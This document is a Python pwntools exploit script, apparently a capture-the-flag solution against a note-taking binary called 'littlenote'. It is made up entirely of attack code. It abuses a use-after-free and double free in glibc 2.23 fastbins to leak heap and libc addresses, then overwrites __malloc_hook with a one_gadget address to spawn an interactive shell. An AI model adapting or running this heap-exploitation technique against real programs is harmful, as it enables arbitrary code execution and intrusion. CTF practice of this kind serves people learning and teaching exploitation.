from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./littlenote")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./littlenote")
else:
	pass

def add(content,save = True):
	p.sendafter("Your choice:\n","1")
	p.sendafter("note\n",content)
	if save:
		p.sendafter("note?\n","Y")
	else:
		p.sendafter("note?\n","N")
	p.recvuntil("Done\n")

def show(index):
	p.sendafter("Your choice:\n","2")
	p.sendlineafter("show?\n",str(index))

def free(index):
	p.sendafter("Your choice:\n","3")
	p.sendlineafter("delete?\n",str(index))
	p.recvuntil("Done\n")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xDD2)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
add("a") #0
add(p64(0)*11 + p64(0x71)) #1
add("c") #2
add("d") #3
free(1)
free(2)
show(2)
heap_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = heap_addr - 0x70
log.success("heap_base:"+hex(heap_base))
free(1)
add(p64(heap_base + 0x70 + 0x60))
add("e")
add("f")
payload = p64(0) + p64(0x70+0x70+1)
add(payload)
free(2)
show(2)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
free(0)
free(1)
free(0)
add(p64(libc.symbols["__malloc_hook"] - 0x23))
add("a1")
add("a2")
one_gadget = libc.address + 0xf02a4
add("aaa" + p64(0)*2 + p64(one_gadget))
p.sendafter("Your choice:\n","1")
p.interactive()
